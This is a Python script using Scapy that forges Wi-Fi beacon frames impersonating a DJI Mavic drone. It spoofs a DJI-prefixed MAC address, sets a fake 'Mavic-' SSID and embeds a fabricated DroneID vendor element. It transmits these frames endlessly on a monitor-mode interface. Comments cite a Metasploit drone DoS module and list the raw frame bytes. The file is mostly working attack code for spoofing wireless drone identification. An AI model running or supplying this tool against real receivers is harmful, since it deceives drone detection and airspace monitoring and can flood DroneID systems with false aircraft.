#!/usr/bin/env python
# -*- coding: UTF-8 -*-
#
# source: https://www.4armed.com/blog/forging-wifi-beacon-frames-using-scapy/
# https://github.com/kismetwireless/kismet/tree/master/dot11_parsers
# https://department13.com/dev/wp-content/uploads/2018/02/Anatomy-of-DJI-Drone-ID-Implementation1.pdf
# https://github.com/MrJabu/ESP8266_DJI_DroneID_Throwie/blob/master/ESP8266_DJI_DroneID_Throwie.ino
# https://pastebin.com/m5bD1zyS

# https://bitbucket.org/secdev/scapy-com/pull-requests/5/complete-set-of-80211-ie-tags/diff

# requires:
#     radiotap supported wifi nic/driver (frame injection) (works fine with Ralink RT2571W)
#     iwconfig $iface mode monitor
#     iw dev $iface set channel $channel
#       or
#     iwlist iface scan
#  
# example:
#    spawn 1000 essids (0-999)
#    #> python fakebeacon.py $(python -c "print ' '.join(i for i in xrange(1000))")
#
from scapy.all import *
import sys
import random
import os

def main():

    serialnum = '0ABC1234567D8'
    ssid="Mavic-"+serialnum
    randomMACPrefix='60:60:1f'
    randomMACPostfix=str(RandMAC())[8:]
    djiMAC=randomMACPrefix+randomMACPostfix	
    iface = sys.argv[1]         #Interface name here

    print('MAC-Adres: '+djiMAC)
    print('SSID: '+ssid)
	
    dot11 = Dot11(type=0, subtype=8, addr1='ff:ff:ff:ff:ff:ff',addr2=djiMAC, addr3=djiMAC)
    beacon = Dot11Beacon(cap='short-slot+ESS+privacy+short-preamble')
    essid = Dot11Elt(ID='SSID',info=ssid, len=len(ssid))
    rates=Dot11Elt(ID='Rates',info='\x82\x84\x8b\x0c\x12\x96\x18\x24')  #supported rates
    dsset=Dot11Elt(ID='DSset',info='\x0b')  #current channel
    tim=Dot11Elt(ID='TIM',info='\x00\x01\x00\x00')  #traffic indication map
    country=Dot11Elt(ID=7,info='\x55\x53\x00\x01\x0b,\x1e') #country information
    erpinfo=Dot11Elt(ID='ERPinfo',info='0x00')  #erp information
    esrates=Dot11Elt(ID='ESRates',info='\x30\x48\x60\x6c') #extended supported rates
    htcap=Dot11Elt(ID=45,info='\xac\x01\x02\xff\xff\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00')  #HT Capabilities
    htinfo=Dot11Elt(ID=61,info='\x0b\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00') #HT Information		
    rsn = Dot11Elt(ID='RSNinfo', info='\x01\x00\x00\x0f\xac\x04\x01\x00\x00\x0f\xac\x04\x01\x00\x00\x0f\xac\x02\x0c\x00') #RSN Information	        	          
    vendorsp = Dot11Elt(ID='vendor', info='\x00\x50\xf2\x02\x01\x01\x00\x00\x03\xa4\x00\x00\x27\xa4\x00\x00\x42\x43\x5e\x00\x62\x32\x2f\x00')   #Vendor Specific: Microsoft WMM/WME Paramater Element
    vendordrone = Dot11Elt(ID='vendor', info='\x26\x37\x12\x58\x62\x13\x10\x01\x5a\x00\xd7\x0f\x44\x72\x6f\x6e\x65\x49\x44\x20\x69\x73\x20\x63\x72\x61\x70\x21\xb0\x78\x5b\x00\x29\xeb\xc2\xfe\xf6\x00\xd3\x00\xd8\x00\xab\x00\x3b\x00\xc0\x00\xf4\x00\x40\x00\x0c\x05\x3c\x00\x30\x79\x2f\x01\x10\x06\x31\x39\x35\x37\x34\x31\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00')   #fixedDroneID
    frame = RadioTap()/dot11/beacon/essid/rates/dsset/tim/country/erpinfo/esrates/htcap/htinfo/rsn/vendorsp/vendordrone
	
    frame.show()
    print("\nHexDump of frame:")
    hexdump(frame)

    sendp(frame, iface=iface, inter=0.100, loop=1)
    
if __name__=="__main__":
    main()

#Packets of ESP8266_DJI_DroneID_Throwie.ino
#    // ssid length and ssid 
#    0x00, 0x0c, 0x41, 0x42, 0x43, 0x44, 0x45, 0x46, 0x41, 0x42, 0x43, 0x44, 0x45, 0x46, 
#    // supported rates
#    0x01, 0x08, 0x82, 0x84, 0x8b, 0x0c, 0x12, 0x96, 0x18, 0x24, 
#    // current channel
#    0x03, 0x01, 0x0b, 
#    // traffic indication map
#    0x05, 0x04, 0x00, 0x01, 0x00, 0x00, 
#    // country information
#    0x07, 0x06, 0x55, 0x53, 0x00, 0x01, 0x0b, 0x1e, 
#    // erp information
#    0x2a, 0x01, 0x00, 
#    // extended supported rates
#    0x32, 0x04, 0x30, 0x48, 0x60, 0x6c, 
#    // HT Capabilities
#    0x2d, 0x1a, 0xac, 0x01, 0x02, 0xff, 0xff, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
#    // HT Information
#    0x3d, 0x16, 0x0b, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
#    // RSN Information
#    0x30, 0x14, 0x01, 0x00, 0x00, 0x0f, 0xac, 0x04, 0x01, 0x00, 0x00, 0x0f, 0xac, 0x04, 0x01, 0x00, 0x00, 0x0f, 0xac, 0x02, 0x0c, 0x00, 
#    // Vendor Specific: Microsoft WMM/WME Paramater Element
#    0xdd, 0x18, 0x00, 0x50, 0xf2, 0x02, 0x01, 0x01, 0x00, 0x00, 0x03, 0xa4, 0x00, 0x00, 0x27, 0xa4, 0x00, 0x00, 0x42, 0x43, 0x5e, 0x00, 0x62, 0x32, 0x2f, 0x00,
#    // fixedDroneID sample - https://github.com/DJISDKUser/metasploit-framework/blob/62e36f1b5c6cae0abed9c86c769bd1656931061c/modules/auxiliary/dos/wifi/droneid.rb#L93
#    0xdd, 0x52, 0x26, 0x37, 0x12, 0x58, 0x62, 0x13, 0x10, 0x01, 0x5a, 0x00, 0xd7, 0x0f, 0x44, 0x72, 0x6f, 0x6e, 0x65, 0x49, 0x44, 0x20, 0x69, 0x73, 0x20, 0x63, 0x72, 0x61, 0x70, 0x21, 0xb0, 0x78, 0x5b, 0x00, 0x29, 0xeb, 0xc2, 0xfe, 0xf6, 0x00, 0xd3, 0x00, 0xd8, 0x00, 0xab, 0x00, 0x3b, 0x00, 0xc0, 0x00, 0xf4, 0x00, 0x40, 0x00, 0x0c, 0x05, 0x3c, 0x00, 0x30, 0x79, 0x2f, 0x01, 0x10, 0x06, 0x31, 0x39, 0x35, 0x37, 0x34, 0x31, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 
